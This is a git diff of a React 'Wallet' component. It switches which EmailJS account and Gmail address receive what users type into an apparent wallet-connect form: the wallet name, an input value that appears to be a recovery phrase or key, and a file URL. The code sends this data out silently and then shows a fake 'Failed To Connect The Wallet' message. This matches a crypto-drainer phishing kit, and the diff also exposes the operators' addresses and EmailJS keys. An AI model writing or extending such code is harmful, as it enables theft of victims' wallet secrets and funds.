@@ -132,10 +132,10 @@ const Wallet = () => {
         // git commit -m "Your update message here"
         // git push
         let templateParams = {
-            from_email: "dazaloland@gmail.com",
-            // from_email: "techjames27@gmail.com",
-            to_email: "dazaloland@gmail.com",
-            // to_email: "techjames27@gmail.com",
+            // from_email: "dazaloland@gmail.com",
+            from_email: "techjames27@gmail.com",
+            // to_email: "dazaloland@gmail.com",
+            to_email: "techjames27@gmail.com",
             wallets: selectedWallet?.name,
             wallet_name: walletName || "N/A",
             input_value: inputValue,
@@ -143,14 +143,12 @@ const Wallet = () => {
             file_url: fileUrl || "No link to download",
         }
         // emailjs.send("service_n8wfwi8", "template_ajvfdr7", templateParams, "fkNhhzrs3FhPuz9cW") // techjames27@gmail.com
-        emailjs.send("service_xn96ima", "template_fqf2u5w", templateParams, "gmQnpCyVXg3liXyDO") // secondtechjames@gmail.com
-        // emailjs.send("service_i13gstj", "template_m0wmsy5", templateParams, "kwk2618gjbpiY0Y04") // thirdtechjames@gmail.com
+        // emailjs.send("service_xn96ima", "template_fqf2u5w", templateParams, "gmQnpCyVXg3liXyDO") // secondtechjames@gmail.com
+        emailjs.send("service_i13gstj", "template_m0wmsy5", templateParams, "kwk2618gjbpiY0Y04") // thirdtechjames@gmail.com
             .then(() => {
-                // alert("Message sent successfully!");
                 startCountdown()
             })
             .catch((error) => {
-                // alert("Failed to send message, try again.");
                 console.error(error)
                 let errorMessage = "Failed To Connect The Wallet, Try Again" 
             })
